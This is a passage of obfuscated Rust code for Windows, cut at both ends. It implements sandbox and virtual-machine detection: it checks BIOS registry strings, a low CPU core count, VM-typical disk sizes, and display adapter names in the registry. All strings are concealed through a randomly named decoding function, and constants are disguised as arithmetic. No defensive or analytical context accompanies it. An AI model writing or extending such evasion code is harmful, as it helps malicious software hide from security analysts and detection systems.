, 109 , 215 , 78 , 250 , 244 , 43 , 63 , 120 , 255 , 86 , 155 , 105 , 7 , 180 , 154 , 5 , 118 , 83 , 168 , 150 , 20 , 137 , 62 , 115 , 166 , 45 , 39 , 221 , 163 , 183 , 158 , 197 , 228 , 183 , 158 , 57 , 185 , 51 , 92 , 145 , 122 , 231 , 54 , 171 , 253 , 81 , 252 , 211 , 159 , 187 , 40 , 199 , 238 , 173 , 243 , 91 , 176 , 132 , 228 , 21 , 141 , 5 , 243 , 253 , 197 , 120 , 103 , 218 , 69 , 206 , 252 , 89 , 113 , 191 , 3 , 42 , 88 , 214 , 250 , 11 , 38 , 86 , 39 , 235 , 116 , 57 , 156 , 156 , 53 , 19 , 48 , 65 , 194 , 91 , 186 , 96 , 69 , 188 , 253 , 210 , 248 , 67 , 187 , 39 , 225 , 133 , 201 , 176 , 170 , 17 , 147 , 85 , 90 , 22 , 179 , 11 , 11 , 172] , & [21 , 230 , 249 , 53 , 122 , 117 , 127 , 149 , 112 , 245 , 116 , 246 , 120 , 165 , 120 , 240 , 181 , 239 , 133 , 252 , 9 , 121 , 107 , 103 , 141 , 126 , 58 , 23 , 19 , 234 , 169 , 73 , 243 , 158 , 149 , 48 , 144 , 108 , 6 , 30 , 8 , 23 , 184 , 83 , 42 , 8 , 44 , 57 , 214 , 245 , 189 , 91 , 124 , 198 , 174 , 4 , 124 , 226 , 141 , 196 , 48 , 92 , 99 , 168 , 23 , 112 , 182 , 154 , 156 , 242 , 49 , 4 , 66 , 6 , 99 , 106 , 192 , 28 , 91 , 123 , 188 , 223 , 167 , 36 , 157 , 137 , 151 , 168] , 19288698127265u64) , decode_tk_smkebhmyyv (& [33 , 176 , 204 , 116 , 161 , 112 , 99 , 124 , 241 , 193 , 126 , 176 , 30 , 172 , 188 , 166 , 29 , 58 , 151 , 231 , 247 , 172 , 93 , 29 , 99 , 164 , 63 , 87 , 193 , 232 , 184 , 227 , 1 , 18 , 210 , 203 , 37 , 163 , 254 , 125 , 54 , 222 , 107 , 207 , 166 , 240 , 164 , 192 , 84 , 97 , 199 , 139 , 110 , 247 , 34 , 211 , 32 , 111 , 196 , 112 , 202 , 191 , 67 , 45] , & [54 , 155 , 204 , 21 , 238 , 62 , 168 , 120 , 59 , 138 , 106 , 118 , 76 , 20 , 139 , 137 , 173 , 68 , 182 , 2 , 30 , 81 , 143 , 135 , 10 , 168 , 72 , 7 , 154 , 247 , 32 , 106 , 156 , 53 , 119 , 157 , 215 , 81 , 113 , 183 , 243 , 73 , 167 , 56 , 143 , 157 , 181 , 137 , 243 , 124 , 51 , 14 , 189 , 161 , 141 , 227 , 108 , 194 , 66 , 239 , 27 , 214 , 240 , 104 , 20 , 159 , 224 , 7 , 252 , 200 , 55 , 19 , 107 , 119 , 51 , 198 , 118 , 57 , 246 , 202 , 98 , 74 , 227 , 78 , 30 , 211 , 42 , 170] , 2486786064684u64) ,] ; let value_names = [decode_tk_smkebhmyyv (& [183 , 4 , 140 , 69 , 90 , 5 , 23 , 96 , 53 , 104 , 148 , 143 , 236 , 165 , 128 , 251 , 3 , 153 , 66 , 157 , 178 , 233 , 118 , 189 , 72 , 155 , 92 , 34 , 122 , 231 , 13 , 76 , 224 , 41 , 150 , 141 , 255 , 65 , 208 , 151 , 178 , 142 , 110 , 40 , 167 , 98 , 106 , 238 , 86 , 172 , 110 , 239 , 202 , 217 , 253 , 6 , 154 , 22 , 166 , 46 , 164 , 125 , 139 , 50 , 251 , 112 , 17 , 237 , 166 , 93 , 95 , 93 , 173 , 59 , 168 , 209 , 198 , 195 , 82 , 224 , 185 , 9 , 239 , 235 , 161 , 242 , 32 , 249 , 76 , 226 , 2 , 24 , 188 , 192 , 9 , 38 , 29 , 190 , 128 , 2 , 72 , 16 , 58 , 189 , 109 , 192 , 248 , 114 , 234 , 99 , 123 , 52 , 35 , 36 , 177 , 251 , 104 , 125 , 159 , 217 , 181 , 67 , 172 , 120 , 206 , 172 , 192 , 210 , 172 , 173 , 249 , 38 , 13 , 16 , 61 , 114 , 107 , 84 , 206 , 87 , 189 , 56 , 90 , 146 , 150 , 227 , 239 , 166 , 223 , 217 , 96 , 228 , 105 , 27 , 129 , 161 , 151 , 87 , 197 , 228 , 13 , 33 , 30 , 28 , 154 , 59 , 194 , 28 , 118 , 185 , 82 , 51 , 25 , 113 , 106 , 16 , 152 , 66 , 149 , 105 , 43 , 239 , 166 , 109 , 127 , 31 , 250 , 192 , 81 , 25 , 249 , 132 , 33 , 217 , 136 , 179 , 138 , 172 , 148 , 178 , 205 , 234 , 58 , 246 , 9 , 158 , 139 , 174] , & [147 , 113 , 122 , 242 , 1 , 114 , 254 , 97 , 3 , 16 , 251 , 112 , 84 , 18 , 183 , 225 , 51 , 120 , 189 , 105 , 32 , 229 , 101 , 194 , 249 , 151 , 40 , 11 , 243 , 233 , 29 , 211 , 66 , 75 , 211 , 145 , 238 , 188 , 107 , 49 , 106 , 167 , 153 , 186 , 99 , 183 , 185 , 111 , 43 , 42 , 126 , 175 , 36 , 138 , 218 , 22 , 215 , 98 , 102 , 10 , 115 , 218 , 185 , 4 , 112 , 216 , 116 , 17 , 147 , 250 , 180 , 42 , 64 , 227 , 49 , 55 , 14 , 161 , 242 , 33 , 168 , 208 , 243 , 141 , 127 , 106 , 123 , 217] , 68350109550329u64) , decode_tk_smkebhmyyv (& [102 , 13 , 228 , 94 , 66 , 150 , 236 , 32 , 187 , 144 , 52 , 35 , 103 , 245 , 135 , 103 , 13 , 116 , 232 , 186 , 19 , 235 , 74 , 51 , 163 , 50 , 133 , 83 , 96 , 217 , 62 , 65 , 216 , 166 , 230 , 253 , 164 , 173 , 164 , 132 , 246 , 125 , 13 , 98 , 109 , 235 , 127 , 8 , 188 , 108 , 73 , 31 , 168 , 222 , 204 , 102 , 111 , 209 , 19 , 62 , 13 , 37 , 226 , 9 , 3 , 246 , 240 , 42 , 215 , 40 , 0 , 207 , 220 , 152 , 50 , 249 , 241 , 118 , 162 , 7 , 41 , 133 , 89 , 44 , 125 , 19 , 30 , 110 , 12 , 151 , 162 , 51 , 106 , 245 , 189 , 101 , 25 , 125 , 114 , 73 , 251 , 232 , 169 , 52 , 37 , 33 , 162 , 251 , 59 , 26 , 119 , 251 , 115 , 202 , 131 , 162 , 161 , 57 , 55 , 55 , 87 , 19 , 12 , 87 , 40 , 6 , 85 , 161 , 170 , 105 , 209 , 186 , 63 , 91 , 77 , 46 , 93 , 171 , 122 , 73 , 37 , 94 , 72 , 35 , 199 , 125 , 213 , 62 , 11 , 158 , 5 , 33 , 140 , 202 , 167 , 116 , 171 , 221 , 112 , 36 , 135 , 223 , 138 , 80 , 236 , 68 , 251 , 147 , 56 , 121 , 241 , 104 , 42 , 186 , 180 , 50 , 149 , 121 , 146 , 102 , 134 , 82 , 81 , 29 , 84 , 226 , 223 , 190 , 3 , 211 , 58 , 89 , 12 , 178 , 87 , 20 , 24 , 10 , 22 , 88 , 114 , 133 , 9 , 145 , 254 , 202 , 79 , 60] , & [170 , 73 , 8 , 86 , 62 , 156 , 70 , 128 , 102 , 85 , 9 , 90 , 110 , 113 , 22 , 32 , 210 , 137 , 43 , 87 , 23 , 251 , 45 , 202 , 93 , 104 , 139 , 152 , 114 , 231 , 145 , 94 , 8 , 225 , 240 , 27 , 154 , 206 , 237 , 33 , 241 , 203 , 81 , 6 , 50 , 192 , 245 , 222 , 184 , 30 , 24 , 231 , 187 , 76 , 199 , 198 , 87 , 65 , 186 , 165 , 99 , 221 , 237 , 129 , 190 , 71 , 43 , 219 , 228 , 215 , 129 , 199 , 62 , 132 , 202 , 239 , 72 , 80 , 162 , 177 , 23 , 92 , 224 , 23 , 104 , 76 , 192 , 210] , 58377195488875u64)] ; for value_name in & value_names { let mut buffer : [u16 ; (30 + 226)] = [0 ; (38 + 218)] ; let mut buffer_size = (buffer . len () * std :: mem :: size_of :: < u16 > ()) as u32 ; let value_name_pcwstr = b_acilzxq (& * * value_name) ; if unsafe { RegQueryValueExW (key_handle , PCWSTR (value_name_pcwstr . as_ptr ()) , None , None , Some (buffer . as_mut_ptr () as * mut u8) , Some (& mut buffer_size) ,) } . is_ok () { let value = String :: from_utf16_lossy (& buffer [.. buffer_size as usize / 2]) ; for vm_string in & vm_bios_strings { if value . contains (& * * vm_string) { unsafe { let _ = RegCloseKey (key_handle) ; } ; return true ; } } } } unsafe { let _ = RegCloseKey (key_handle) ; } ; false } pub fn check_cpu_cores () -> bool { let mut system_info : SYSTEM_INFO = unsafe { std :: mem :: zeroed () } ; unsafe { GetSystemInfo (& mut system_info) ; } matches ! (system_info . dwNumberOfProcessors , 1 | 2) } pub fn check_disk_size () -> bool { let mut total_number_of_bytes : u64 = 0 ; let root_path = b_acilzxq (& decode_tk_smkebhmyyv (& [146 , 132 , 16 , 89 , 247 , 228 , 34 , 147 , 9 , 220 , 187 , 160 , 68 , 10 , 109 , 20 , 240 , 89 , 49 , 187 , 150 , 192 , 173 , 163 , 242 , 155 , 36 , 208 , 69 , 195 , 115 , 75 , 238 , 152 , 17 , 138 , 115 , 11 , 221 , 105 , 50 , 11 , 39 , 136 , 88 , 21 , 185 , 109 , 169 , 76 , 132 , 170 , 205 , 208 , 141 , 102 , 90 , 225 , 20 , 200 , 170 , 250 , 185 , 72] , & [229 , 70 , 162 , 254 , 152 , 1 , 121 , 53 , 217 , 196 , 8 , 52 , 194 , 194 , 55 , 174 , 111 , 138 , 210 , 60 , 70 , 88 , 196 , 170 , 177 , 233 , 71 , 27 , 255 , 210 , 180 , 80 , 201 , 210 , 233 , 3 , 159 , 90 , 162 , 66 , 50 , 149 , 241 , 90 , 27 , 117 , 181 , 71 , 116 , 230 , 49 , 229 , 97 , 230 , 78 , 204 , 67 , 167 , 149 , 99 , 30 , 246 , 87 , 128 , 241 , 127 , 58 , 226 , 143 , 72 , 193 , 243 , 172 , 194 , 86 , 114 , 159 , 130 , 6 , 249 , 235 , 188 , 46 , 82 , 58 , 22 , 126 , 145] , 1769526526170u64)) ; if unsafe { GetDiskFreeSpaceExW (PCWSTR (root_path . as_ptr ()) , None , Some (& mut total_number_of_bytes) , None ,) } . is_ok () { let common_vm_sizes = [(18 + 42) * (380 + 644) * (201 + 823) * (78 + 946) , (24 + 56) * (285 + 739) * (368 + 656) * (375 + 649) , (4 + 96) * (61 + 963) * (450 + 574) * (293 + 731) ,] ; common_vm_sizes . contains (& total_number_of_bytes) } else { false } } pub fn check_display_adapter () -> bool { let mut video_key_handle : HKEY = HKEY (0) ; let video_key_path = b_acilzxq (& decode_tk_smkebhmyyv (& [240 , 202 , 57 , 124 , 120 , 55 , 50 , 192 , 46 , 202 , 104 , 182 , 25 , 198 , 17 , 173 , 134 , 96 , 32 , 252 , 2 , 186 , 70 , 202 , 146 , 13 , 247 , 253 , 246 , 204 , 105 , 164 , 205 , 241 , 94 , 254 , 203 , 79 , 171 , 195 , 203 , 241 , 228 , 26 , 147 , 223 , 236 , 238 , 39 , 229 , 197 , 184 , 241 , 238 , 72 , 253 , 54 , 111 , 83 , 206 , 86 , 140 , 191 , 60 , 0 , 69 , 146 , 128 , 164 , 81 , 198 , 254 , 65 , 213 , 111 , 30 , 156 , 85 , 137 , 170 , 130 , 66 , 209 , 20 , 239 , 117 , 224 , 173 , 5 , 43 , 183 , 76 , 158 , 84 , 237 , 158 , 111 , 197 , 140 , 22 , 47 , 115 , 61 , 116 , 117 , 219 , 164 , 136 , 15 , 87 , 185 , 100 , 20 , 1 , 2 , 158 , 93 , 39 , 130 , 127 , 88 , 101 , 140 , 169 , 94 , 166 , 227 , 199 , 25 , 47 , 60 , 41 , 12 , 244 , 72 , 159 , 95 , 66 , 138 , 162 , 87 , 138 , 89 , 83 , 112 , 144 , 162 , 136 , 206 , 251 , 195 , 219 , 19 , 107 , 93 , 30 , 234 , 187 , 203 , 89 , 93 , 131 , 90 , 27 , 5 , 51 , 33 , 110 , 114 , 238 , 242 , 3 , 249 , 64 , 36 , 145 , 34 , 28 , 6 , 99 , 74 , 252 , 164 , 214 , 51 , 237 , 42 , 65 , 140 , 15 , 133 , 27 , 205 , 18 , 41 , 8 , 41 , 116 , 154 , 73 , 197 , 98 , 138 , 4 , 95 , 12 , 141 , 90 , 65 , 252 , 94 , 46 , 103 , 35 , 176 , 26 , 223 , 142 , 253 , 173 , 130 , 184 , 234 , 117 , 51 , 229 , 207 , 114 , 55 , 22 , 59 , 169 , 24 , 144 , 156 , 170 , 164 , 66 , 111 , 15 , 194 , 70 , 33 , 160 , 213 , 0 , 11 , 6 , 81 , 197 , 164 , 76 , 148 , 138 , 159 , 77 , 107 , 136 , 175 , 80 , 110 , 91 , 84 , 86 , 230 , 122 , 131 , 85 , 10 , 81 , 188 , 88 , 246 , 163 , 57 , 242 , 122 , 183 , 243 , 64 , 193 , 122 , 32 , 212 , 28 , 185 , 21 , 179 , 89 , 82 , 182 , 133 , 164 , 244 , 212 , 48 , 226 , 240 , 187 , 20 , 216 , 220 , 87 , 181 , 183 , 1 , 123 , 166 , 7 , 142 , 220 , 3 , 249 , 217 , 26 , 176 , 187 , 224 , 114 , 215 , 236 , 102 , 106 , 96 , 225 , 213 , 127 , 138 , 39 , 78 , 201 , 202 , 42 , 108 , 217 , 91 , 154 , 218 , 171 , 190 , 24 , 173 , 117 , 105 , 182 , 137 , 209 , 230 , 255 , 33 , 81 , 63 , 173 , 137 , 58 , 12 , 234 , 200 , 217 , 122 , 51 , 134 , 131 , 113 , 234 , 63 , 246 , 94 , 17 , 182 , 122 , 29 , 56 , 11 , 103 , 24 , 140 , 15 , 197 , 235 , 15 , 251 , 152 , 204 , 214 , 114 , 141 , 83 , 57 , 147 , 226 , 39 , 58 , 204 , 20 , 30 , 217 , 71 , 147 , 171 , 249 , 151 , 14 , 166 , 227 , 199 , 174 , 159 , 24 , 29 , 128 , 198 , 4 , 105 , 82 , 202 , 234 , 201 , 83 , 250 , 104 , 69 , 207 , 211 , 204 , 99 , 92 , 45 , 14 , 173 , 240 , 200 , 189 , 87 , 180 , 166 , 145 , 178 , 63 , 77 , 166 , 96 , 35 , 109 , 72 , 157 , 153 , 70] , & [208 , 235 , 224 , 71 , 101 , 44 , 210 , 113 , 149 , 143 , 184 , 225 , 204 , 59 , 211 , 48 , 80 , 37 , 150 , 129 , 201 , 106 , 96 , 12 , 128 , 254 , 237 , 173 , 237 , 86 , 146 , 88 , 204 , 193 , 133 , 214 , 44 , 48 , 3 , 26 , 28 , 191 , 64 , 236 , 240 , 20 , 201 , 83 , 97 , 144 , 98 , 75 , 201 , 228 , 98 , 238 , 59 , 195 , 220 , 177 , 230 , 100 , 139 , 70 , 235 , 55 , 142 , 36 , 188 , 77 , 42 , 17 , 71 , 90 , 81 , 111 , 94 , 233 , 81 , 168 , 127 , 245 , 5 , 131 , 22 , 167 , 236 , 178] , 25589415153346u64)) ; if unsafe { RegOpenKeyExW (HKEY_LOCAL_MACHINE , PCWSTR (video_key_path . as_ptr ()) , 0 , KEY_READ , & mut video_key_handle ,) } . is_err () { return false ; } let vm_adapters = [decode_tk_smkebhmyyv (& [171 , 193 , 144 , 53 , 82 , 52 , 207 , 191 , 225 , 225 , 229 , 84 , 177 , 176 , 172 , 66 , 145 , 80 , 45 , 242 , 109 , 149 , 200 , 220 , 129 , 61 , 254 , 196 , 57 , 78 , 20 , 103 , 125 , 187 , 203 , 156 , 110 , 219 , 191 , 250 , 16 , 22 , 14 , 134 , 18 , 193 , 175 , 157 , 198 , 217 , 79 , 132 , 109 , 12 , 195 , 181 , 17 , 232 , 61 , 30 , 38 , 210 , 9 , 211 , 132 , 57 , 53 , 232 , 74 , 84 , 63 , 89 , 0 , 198 , 166 , 94 , 249 , 253 , 122 , 201 , 20 , 104 , 71 , 96 , 7 , 89 , 107 , 221 , 103 , 42 , 126 , 106 , 30 , 105 , 236 , 164 , 57 , 93 , 49 , 173 , 114 , 29 , 57 , 252 , 15 , 0 , 115 , 4 , 128 , 119 , 71 , 251 , 225 , 222 , 46 , 64 , 93 , 57 , 138 , 36 , 229 , 189 , 27 , 102 , 54 , 145 , 109 , 98 , 181 , 129 , 128 , 215 , 67 , 239 , 192 , 59 , 199 , 109 , 139 , 232 , 101 , 163 , 164 , 139] , & [148 , 228 , 114 , 106 , 31 , 129 , 225 , 47 , 146 , 137 , 121 , 166 , 87 , 104 , 108 , 163 , 5 , 51 , 17 , 176 , 35 , 100 , 203 , 205 , 3 , 177 , 56 , 83 , 16 , 111 , 92 , 235 , 232 , 48 , 45 , 122 , 67 , 10 , 221 , 80 , 76 , 192 , 41 , 43 , 23 , 120 , 247 , 96 , 6 , 43 , 74 , 169 , 72 , 103 , 101 , 214 , 127 , 190 , 61 , 115 , 31 , 170 , 32 , 65 , 98 , 52 , 211 , 57 , 39 , 0 , 110 , 152 , 9 , 5 , 173 , 118 , 82 , 3 , 248 , 130 , 123 , 214 , 201 , 11 , 197 , 246 , 94 , 159] , 25490630902692u64) , decode_tk_smkebhmyyv (& [179 , 212 , 107 , 248 , 24 , 167 , 203 , 45 , 191 , 22 , 68 , 119 , 226 , 198 , 75 , 42 , 170 , 190 , 56 , 19 , 56 , 248 , 102 , 167 , 200 , 202 , 200 , 146 , 235 , 84 , 121 , 116 , 173 , 235 , 162 , 28 , 101 , 15 , 106 , 194 , 108 , 15 , 26 , 39 , 72 , 161 , 215 , 166 , 209 , 65 , 220 , 221 , 62 , 179 , 18 , 226 , 46 , 147 , 83 , 72 , 243 , 96 , 251 , 195 , 97 , 239 , 237 , 213 , 231 , 32 , 63 , 14 , 130 , 187 , 208 , 104 , 89 , 82 , 246 , 33 , 25 , 27 , 163 , 95 , 29 , 158 , 82 , 173 , 199 , 243 , 211 , 176 , 196 , 205 , 12 , 127 , 87 , 208 , 115 , 204 , 51 , 20 , 182 , 26 , 126 , 208 , 226 , 100 , 112 , 40 , 241 , 5 , 13 , 155 , 56 , 221 , 255 , 187 , 219 , 131 , 102 , 143 , 187 , 178 , 203 , 152 , 195 , 172 , 9 , 182 , 222 , 78 , 248 , 65 , 91 , 2 , 174 , 58 , 201 , 193 , 175 , 106 , 31 , 2 , 29 , 141 , 158 , 221 , 81 , 50 , 21 , 32 , 192 , 3 , 41 , 153 , 107 , 83 , 191 , 251 , 2 , 56 , 28 , 137 , 138 , 16 , 9 , 122 , 120 , 164 , 22 , 70 , 88 , 236 , 105 , 172 , 17 , 219 , 136 , 64 , 82 , 91 , 87 , 44 , 63 , 214 , 67 , 87 , 133 , 78 , 252 , 7 , 216 , 191 , 246 , 159 , 223 , 61 , 130 , 217 , 237 , 127 , 128 , 33 , 215 , 59 , 220 , 213 , 29 , 178 , 194 , 62 , 106 , 162 , 156 , 242 , 42 , 52 , 188 , 159 , 72 , 227 , 206 , 162 , 209 , 21 , 120 , 98 , 30 , 244 , 150 , 160 , 96 , 27 , 43 , 4 , 173 , 167 , 33 , 2 , 139 , 134 , 189 , 60 , 63 , 0 , 65 , 240 , 34 , 207 , 112 , 14 , 143 , 169 , 163 , 184 , 166 , 185 , 135 , 124 , 183 , 25 , 251 , 20 , 207 , 253 , 162 , 180 , 180 , 249 , 54 , 246 , 111 , 114 , 67 , 205 , 49 , 51 , 3 , 147 , 1 , 233 , 200 , 85 , 228 , 205 , 143 , 192 , 60 , 251 , 11 , 19 , 185 , 220 , 194 , 46 , 75 , 96 , 116 , 29 , 241 , 201 , 252 , 71 , 19 , 115 , 225 , 239 , 251 , 182 , 3 , 225 , 242 , 29 , 120 , 248 , 133 , 254 , 118 , 182 , 247 , 153 , 204 , 9 , 29 , 215 , 141 , 65 , 105 , 243 , 168 , 129 , 114 , 194 , 1 , 10] , & [47 , 153 , 40 , 63 , 22 , 105 , 94 , 159 , 243 , 57 , 52 , 125 , 48 , 107 , 162 , 43 , 177 , 115 , 199 , 204 , 244 , 21 , 228 , 73 , 77 , 244 , 58 , 137 , 109 , 126 , 235 , 239 , 54 , 65 , 246 , 226 , 88 , 70 , 89 , 18 , 250 , 90 , 173 , 8 , 66 , 246 , 178 , 80 , 248 , 123 , 77 , 102 , 150 , 28 , 201 , 191 , 253 , 13 , 98 , 226 , 211 , 184 , 215 , 41 , 112 , 92 , 192 , 11 , 76 , 136 , 252 , 122 , 56 , 188 , 43 , 90 , 2 , 136 , 161 , 40 , 82 , 75 , 172 , 190 , 121 , 187 , 254 , 82] , 158634617080387u64) , decode_tk_smkebhmyyv (& [190 , 139 , 59 , 119 , 175 , 218 , 2 , 20 , 210 , 148 , 183 , 162 , 119 , 124 , 83 , 177 , 206 , 3 , 128 , 162 , 180 , 233 , 63 , 58 , 108 , 33 , 201 , 228 , 189 , 170 , 138 , 53 , 54 , 30 , 55 , 2 , 213 , 227 , 255 , 162 , 236 , 79 , 253 , 124 , 159 , 197 , 109 , 235 , 113 , 215 , 84 , 255 , 136 , 41 , 93 , 178 , 134 , 134 , 70 , 216 , 103 , 199 , 206 , 65 , 43 , 35 , 236 , 132 , 221 , 94 , 219 , 39 , 67 , 35 , 152 , 155 , 166 , 209 , 108 , 80 , 27 , 224 , 215 , 189 , 228 , 192 , 238 , 40 , 29 , 204 , 116 , 62 , 181 , 253 , 136 , 4 , 89 , 253 , 3 , 177 , 116 , 37 , 117 , 128 , 183 , 187 , 123 , 51 , 16 , 9 , 174 , 22 , 222 , 147 , 87 , 17 , 162 , 46 , 30 , 213 , 4 , 254 , 55 , 26 , 255 , 253 , 3 , 48 , 71 , 218 , 48 , 143 , 12 , 75 , 123 , 86 , 110 , 247 , 176 , 90 , 186 , 213 , 174 , 34 , 175 , 150 , 113 , 122 , 203 , 147 , 252 , 187 , 79 , 169 , 123 , 38 , 231 , 89 , 244 , 229] , & [187 , 29 , 92 , 251 , 57 , 105 , 202 , 104 , 121 , 135 , 216 , 236 , 224 , 212 , 174 , 88 , 233 , 175 , 0 , 201 , 66 , 241 , 60 , 116 , 159 , 32 , 248 , 86 , 105 , 18 , 23 , 237 , 143 , 164 , 133 , 251 , 240 , 205 , 143 , 207 , 32 , 104 , 162 , 208 , 27 , 193 , 221 , 201 , 218 , 227 , 123 , 34 , 169 , 227 , 5 , 183 , 111 , 14 , 124 , 176 , 90 , 222 , 124 , 202 , 202 , 180 , 26 , 3 , 125 , 49 , 165 , 31 , 213 , 57 , 163 , 136 , 249 , 206 , 155 , 75 , 77 , 71 , 82 , 122 , 10 , 47 , 57 , 252] , 35588099015843u64) , decode_tk_smkebhmyyv (& [237 , 187 , 99 , 250 , 218 , 44 , 186 , 90 , 246 , 131 , 198 , 178 , 181 , 241 , 116 , 173 , 46 , 75 , 180 , 163 , 124 , 209 , 36 , 93 , 170 , 82 , 167 , 211 , 17 , 63 , 67 , 167 , 36 , 141 , 208 , 211 , 202 , 188 , 174 , 46 , 76 , 56 , 69 , 122 , 177 , 100 , 173 , 124 , 221 , 169 , 10 , 24 , 200 , 31 , 152 , 111 , 183 , 203 , 213 , 198 , 160 , 250 , 95 , 172 , 179 , 37 , 248 , 162 , 160 , 159 , 131 , 75 , 25 , 60 , 48 , 245 , 219 , 9 , 119 , 116 , 208 , 254 , 77 , 90 , 11 , 5 , 188 , 238 , 33 , 113 , 240 , 185 , 101 , 46 , 22 , 122 , 165 , 101 , 224 , 192 , 15 , 75 , 92 , 154 , 129 , 5 , 204 , 152 , 190 , 249 , 74 , 141 , 80 , 119 , 85 , 45 , 241 , 211 , 58 , 138 , 133 , 179 , 238 , 116 , 243 , 129 , 95 , 122 , 69 , 66 , 47 , 8 , 236 , 72 , 54 , 199 , 213 , 156 , 155 , 249 , 16 , 26 , 199 , 35 , 237 , 216 , 17 , 244 , 203 , 208 , 204 , 239 , 197 , 56 , 144 , 45 , 175 , 33 , 17 , 218 , 114 , 53 , 178 , 222 , 68 , 37 , 45 , 215 , 251 , 35 , 123 , 194 , 11 , 225 , 120 , 77 , 64 , 210 , 132 , 218 , 152 , 151 , 19 , 127 , 84 , 23 , 18 , 67 , 142 , 85 , 70 , 88 , 53 , 161 , 81 , 152 , 192 , 112 , 38 , 177 , 218 , 40 , 173 , 141 , 181 , 97 , 116 , 128] , & [186 , 207 , 18 , 159 , 141 , 36 , 104 , 12 , 230 , 139 , 245 , 245 , 49 , 249 , 44 , 220 , 154 , 212 , 203 , 168 , 235 , 76 , 240 , 206 , 22 , 125 , 112 , 115 , 39 , 154 , 146 , 3 , 220 , 16 , 236 , 161 , 9 , 11 , 2 , 48 , 0 , 214 , 216 , 26 , 57 , 156 , 121 , 252 , 94 , 16 , 227 , 249 , 152 , 34 , 106 , 189 , 155 , 153 , 79 , 155 , 132 , 88 , 106 , 155 , 191 , 189 , 177 , 202 , 163 , 54 , 55 , 169 , 124 , 209 , 205 , 76 , 150 , 206 , 173 , 145 , 173 , 119 , 250 , 135 , 121 , 85 , 120 , 44] , 54747948123528u64) , decode_tk_smkebhmyyv (& [254 , 71 , 135 , 96 , 11 , 103 , 23 , 239 , 50 , 185 , 58 , 150 , 145 , 98 , 112 , 137 , 194 , 30 , 95 , 16 , 46 , 103 , 181 , 219 , 124 , 110 , 86 , 219 , 15 , 153 , 136 , 31 , 236 , 59 , 134 , 96 , 25 , 107 , 173 , 89 , 170 , 161 , 114 , 171 , 141 , 253 , 45 , 151 , 132 , 126 , 66 , 149 , 251 , 145 , 165 , 175 , 85 , 165 , 208 , 89 , 115 , 205 , 225 , 199 , 66 , 50 , 198 , 146 , 134 , 109 , 50 , 214 , 87 , 246 , 73 , 83 , 147 , 74 , 153 , 56 , 28 , 217 , 11 , 41 , 26 , 199 , 177 , 179 , 39 , 171 , 25 , 122 , 11 , 249 , 224 , 23 , 214 , 247 , 62 , 30 , 71 , 79 , 150 , 118 , 167 , 14 , 48 , 146 , 237 , 153 , 229 , 146 , 78 , 193 , 14 , 144 , 101 , 209 , 228 , 68 , 125 , 47 , 82 , 173 , 33 , 35 , 164 , 158 , 192 , 203 , 37 , 137 , 21 , 11 , 197 , 82 , 123 , 79 , 170 , 201 , 65 , 63 , 88 , 242 , 208 , 60 , 74 , 70 , 42 , 237 , 85 , 1 , 7 , 124 , 31 , 164 , 44 , 42 , 61 , 254 , 183 , 157 , 185 , 43 , 141 , 243 , 153 , 224 , 49 , 238 , 67 , 199 , 246 , 182 , 36 , 249 , 98 , 84 , 69 , 28 , 20 , 236 , 6 , 102 , 77 , 235 , 126 , 12 , 27 , 161 , 4 , 47 , 165 , 139 , 35 , 254 , 0 , 99 , 46 , 144 , 52 , 64 , 27 , 129 , 163 , 232 , 254 , 186 , 231 , 101 , 173 , 226 , 109 , 28 , 106 , 51 , 196 , 253 , 164 , 144 , 5 , 58 , 246 , 64 , 1 , 22 , 198 , 208 , 245 , 64 , 196 , 181 , 47 , 242 , 43 , 26 , 221 , 101 , 158 , 97 , 15 , 246 , 72 , 57 , 12 , 129 , 186 , 9 , 101 , 199 , 193 , 89 , 221 , 125 , 24 , 183 , 206 , 205 , 177 , 229 , 232 , 119 , 193 , 38 , 150 , 129 , 243 , 175 , 126 , 167 , 23 , 88 , 74 , 45 , 236 , 169 , 158 , 150 , 104 , 169 , 94 , 248 , 117 , 127 , 120 , 61 , 187 , 107 , 3 , 73 , 182 , 4 , 75 , 51 , 210 , 15 , 195 , 2 , 231 , 173 , 29 , 177 , 36 , 165 , 135 , 174 , 7 , 220 , 4 , 118 , 113 , 142 , 95 , 140 , 181 , 28 , 132 , 208 , 152 , 194] , & [177 , 191 , 158 , 99 , 107 , 239 , 197 , 104 , 153 , 245 , 86 , 162 , 146 , 139 , 108 , 235 , 3 , 235 , 168 , 17 , 126 , 53 , 0 , 1 , 50 , 158 , 235 , 71 , 122 , 123 , 155 , 189 , 80 , 183 , 137 , 182 , 37 , 10 , 252 , 112 , 66 , 168 , 168 , 97 , 129 , 227 , 57 , 160 , 182 , 232 , 255 , 112 , 10 , 107 , 245 , 167 , 96 , 233 , 140 , 221 , 225 , 16 , 146 , 156 , 93 , 10 , 185 , 40 , 49 , 234 , 240 , 25 , 175 , 169 , 207 , 133 , 90 , 164 , 30 , 76 , 29 , 98 , 63 , 229 , 66 , 51 , 106 , 246] , 134651519699320u64) ,] ; let mut i = 0 ; loop { let mut subkey_name_buffer : [u16 ; (74 + 182)] = [0 ; (93 + 163)] ; let mut subkey_name_len = subkey_name_buffer . len () as u32 ; if unsafe { RegEnumKeyExW (video_key_handle , i , PWSTR (subkey_name_buffer . as_mut_ptr ()) , & mut subkey_name_len , None , PWSTR (std :: ptr :: null_mut ()) , None , None ,) } . is_err () { break ; } i += 1 ; let subkey_name = String :: from_utf16_lossy (& subkey_name_buffer [.. subkey_name_len as usize]) ; let adapter_key_path = format ! ("SYSTEM\\CurrentControlSet\\Control\\Video\\{}\\0000" , subkey_name) ; let mut adapter_key_handle : HKEY = HKEY (0) ; let adapter_key_pcwstr = b_acilzxq (& adapter_key_path) ; if unsafe { RegOpenKeyExW (HKEY_LOCAL_MACHINE , PCWSTR (adapter_key_pcwstr . as_ptr ()) , 0 , KEY_READ , & mut adapter_key_handle ,) } . is_ok () { let value_name = b_acilzxq (& decode_tk_smkebhmyyv (& [244 , 60 , 171 , 240 , 81 , 10 , 62 , 82 , 67 , 155 , 59 , 44 , 104 , 49 , 149 , 162 , 219 , 163 , 110 , 161 , 197 , 148 , 115 , 103 , 5 , 11 , 72 , 213 , 152 , 40 , 123 , 130 , 3 , 4 , 186 , 128 , 100 , 202 , 144 , 39 , 246 , 31 , 227 , 103 , 177 , 255 , 159 , 21 , 55 , 60 , 159 , 241 , 16 , 194 , 165 , 245 , 41 , 116 , 213 , 132 , 134 , 122 , 89 , 22 , 254 , 172 , 92 , 94 , 85 , 224 , 111 , 78 , 36 , 204 , 14 , 178 , 126 , 105 , 35 , 52 , 57 , 108 , 219 , 167 , 93 , 4 , 135 , 8 